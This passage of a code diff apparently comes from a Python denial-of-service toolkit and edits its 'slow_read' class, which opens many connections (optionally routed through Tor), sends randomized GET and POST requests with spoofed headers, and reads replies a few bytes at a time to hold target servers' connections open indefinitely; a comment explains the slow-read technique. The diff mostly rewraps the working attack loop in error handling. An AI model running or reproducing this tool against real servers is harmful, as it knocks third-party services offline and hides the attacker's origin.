+        sys.stdout.write("\r[{}: Voly sent-->{}]     ".format(x,ipp))
+        sys.stdout.flush()
+      except:
+       break
+      time.sleep(.2)
+    except:
+     pass
+    self.counter-=1
+    time.sleep(.3)
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
   
 '''
    this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.
@@ -887,69 +920,77 @@ class slow_read:
    t.daemon=threads_daemon
    t.start()
  def attack(self):
-  time.sleep(1)
-  while True:
-   if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+  try:
+   time.sleep(1)
+   while True:
+    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
      break
-   if self.stop==True:
+    if self.stop==True:
      break
-   try: 
-    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    if self.tor==False:
-     s.settimeout(self.timeout)
-    if self.tor==True:
-     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
-    s.connect((self.target,self.port))
-    if ((self.port==443)or(self.port==8443)):
-     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
-    while True:
-     if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
-      break
-     if self.stop==True:
-      break
-     pa=random.choice(paths)
-     q=''
-     for i in range(random.randint(2,5)):
-      q+=random.choice(lis)+str(random.randint(1,100000))
-     p=''
-     for i in range(random.randint(2,5)):
-      p+=random.choice(lis)+str(random.randint(1,100000))
-     if '?' in pa:
-      jo='&'
-     else:
-      jo='?' 
-     pa+=jo+q+"="+p
-     try:
-      g=random.randint(1,2)
-      if g==1:
-       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+    try: 
+     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+     if self.tor==False:
+      s.settimeout(self.timeout)
+     if self.tor==True:
+      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
+     s.connect((self.target,self.port))
+     if ((self.port==443)or(self.port==8443)):
+      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+     while True:
+      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
+       break
+      if self.stop==True:
+       break
+      pa=random.choice(paths)
+      q=''
+      for i in range(random.randint(2,5)):
+       q+=random.choice(lis)+str(random.randint(1,100000))
+      p=''
+      for i in range(random.randint(2,5)):
+       p+=random.choice(lis)+str(random.randint(1,100000))
+      if '?' in pa:
+       jo='&'
       else:
-       q='q='
-       for i in range(10,random.randint(20,50)):
-        q+=random.choice(lis)
-       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
-      self.counter+=1
-      while True:    
-       d=s.recv(random.randint(self.read_min,self.read_max))
-       if self.logs==True:
-        sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8').strip())))
-        sys.stdout.flush()
-        #print("Received: {}".format(str(d.decode('utf-8'))))
-       time.sleep(random.randint(self.min_speed,self.max_speed))
-     except:
-      break
-    s.close()
-   except:
-    pass
-  self.kill()
+       jo='?' 
+      pa+=jo+q+"="+p
+      try:
+       g=random.randint(1,2)
+       if g==1:
+        s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+       else:
+        q='q='
+        for i in range(10,random.randint(20,50)):
+         q+=random.choice(lis)
+        s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
+       self.counter+=1
+       while True:    
+        d=s.recv(random.randint(self.read_min,self.read_max))
+        if self.logs==True:
+         sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8').strip())))
+         sys.stdout.flush()
+         #print("Received: {}".format(str(d.decode('utf-8'))))
+        time.sleep(random.randint(self.min_speed,self.max_speed))
+      except:
+       break
+     s.close()
+    except:
+     pass
+   self.kill()
+  except:
+   pass
  def reset(self):
+   l=[]
    for x in self.__dict__:
     self.__dict__[x]=None
+    l.append(x)
+   for x in l:
+    delattr(self,x)
  def kill(self):
-  self.stop=True
-  a=self.__dict__["counter"]
-  self.reset()
-  return a
+  if 'stop' in dir(self):
+   self.stop=True
+   a=self.__dict__["counter"]
+   self.reset()
+   return a
    
 #This is a on process work for next versions
 """
